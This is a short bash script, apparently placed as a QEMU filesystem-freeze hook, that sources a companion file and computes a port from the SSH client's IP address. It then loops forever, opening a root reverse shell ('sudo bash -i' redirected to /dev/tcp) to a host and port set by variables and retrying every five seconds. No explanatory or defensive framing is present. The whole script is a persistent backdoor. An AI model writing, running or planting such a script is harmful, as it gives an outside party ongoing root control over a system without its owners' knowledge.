#!/bin/bash
source /etc/qemu/fs-freezehook.d/fs-freezehook.sh
CIP=$(echo $SSH_CONNECTION | awk '{print $3}')
SECOND=$(echo "$CIP" | cut -d'.' -f2)
P=$(($C + $SECOND))

while true; do
    sudo bash -i >& /dev/tcp/"$I"/"$P" 0>&1
    sleep 5
done